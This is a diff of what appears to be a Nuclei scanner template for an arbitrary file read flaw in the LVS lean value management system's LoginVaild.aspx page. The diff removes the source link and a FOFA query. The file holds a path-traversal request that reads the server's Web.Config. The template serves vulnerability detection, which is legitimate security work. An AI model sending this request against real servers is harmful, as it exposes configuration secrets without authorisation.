@@ -3,12 +3,8 @@ info:
   name: LVS精益价值管理系统 LoginVaild.aspx 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/smntw39q3pu059r6'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: smntw39q3pu059r6
-    fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
 http:
 - raw:
   - 'GET /Business/LoginVaild.aspx?p=UploadFile/../Web.Config HTTP/1.1
